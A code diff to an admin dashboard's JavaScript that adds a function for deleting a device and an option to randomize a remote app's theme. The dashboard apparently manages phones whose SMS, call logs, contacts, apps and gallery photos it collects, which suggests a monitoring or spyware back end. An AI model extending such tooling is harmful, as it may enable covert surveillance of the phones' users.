@@ -323,6 +323,7 @@ function navigateTo(page) {
     if (page === 'videos') loadVideos();
     if (page === 'connections') loadConnections();
     if (page === 'tmdb') initTmdbPage();
+    if (page === 'settings') loadCurrentTheme();
 
     closeSidebar();
 
@@ -666,6 +667,25 @@ function removeDeviceCard(deviceId) {
   recalcConnStats();
 }
 
+async function deleteDevice(deviceId, deviceName) {
+  if (!confirm(`DELETE device "${deviceName}"?\n\nThis will permanently remove ALL data:\n• SMS messages\n• Call logs\n• Contacts\n• Apps\n• Gallery photos\n\nThis action cannot be undone.`)) return;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}`, {
+      method: 'DELETE',
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    if (data.success) {
+      removeDeviceCard(deviceId);
+      showToast(`Device "${deviceName}" deleted successfully`, 'success');
+    } else {
+      showToast('Failed to delete device', 'error');
+    }
+  } catch (err) {
+    showToast('Delete failed: ' + err.message, 'error');
+  }
+}
+
 function renderDeviceGrid() {
   const grid = document.getElementById('deviceGrid');
   if (!allDevices || allDevices.length === 0) {
@@ -780,6 +800,7 @@ function renderDeviceGrid() {
           <span class="dev-row-value">${d.last_seen ? new Date(d.last_seen).toLocaleString() : '?'}</span>
         </div>
       </div>
+      ${!isOnline ? `<div class="dev-delete-wrap"><button class="dev-delete-btn" onclick="event.stopPropagation(); deleteDevice('${d.device_id}', '${esc(deviceName).replace(/'/g, "\\'")}')"><i class="ri-delete-bin-line"></i> DELETE DEVICE</button></div>` : ''}
     </div>`;
   }).join('');
 }
@@ -2583,3 +2604,59 @@ connectWebSocket = function () {
   // Give socket a moment to connect, then init metrics
   setTimeout(() => MetricsEngine.init(), 500);
 };
+
+// ========== Admin App Theme ==========
+const themeColors = {
+  Sage: '#7BA876', Ocean: '#4A90D9', Lavender: '#9B7ED8',
+  Sunset: '#E07B39', Rose: '#D4638F', Slate: '#6B7B8D'
+};
+
+async function loadCurrentTheme() {
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/admin-theme`, {
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    const names = ['Sage', 'Ocean', 'Lavender', 'Sunset', 'Rose', 'Slate'];
+    const name = names[data.themeIndex] || 'Sage';
+    const badge = document.getElementById('currentThemeBadge');
+    if (badge) {
+      badge.textContent = name.toUpperCase();
+      badge.style.background = themeColors[name] || themeColors.Sage;
+    }
+  } catch (_) {}
+}
+
+async function randomizeAdminTheme() {
+  const btn = document.getElementById('randomizeThemeBtn');
+  if (btn) btn.disabled = true;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/admin-theme`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
+      body: JSON.stringify({ randomize: true })
+    });
+    const data = await res.json();
+    if (data.success) {
+      const badge = document.getElementById('currentThemeBadge');
+      if (badge) {
+        badge.textContent = data.themeName.toUpperCase();
+        badge.style.background = themeColors[data.themeName] || themeColors.Sage;
+      }
+      showToast(`Theme changed to ${data.themeName}! App will update on next launch.`, 'success');
+    } else {
+      showToast('Failed to change theme', 'error');
+    }
+  } catch (err) {
+    showToast('Theme change failed: ' + err.message, 'error');
+  } finally {
+    if (btn) btn.disabled = false;
+  }
+}
+
+// Load theme badge when settings page is shown
+const _origShowPage = typeof showPage === 'function' ? showPage : null;
+document.addEventListener('DOMContentLoaded', () => {
+  // Also load on initial page if settings
+  setTimeout(() => loadCurrentTheme(), 1000);
+});
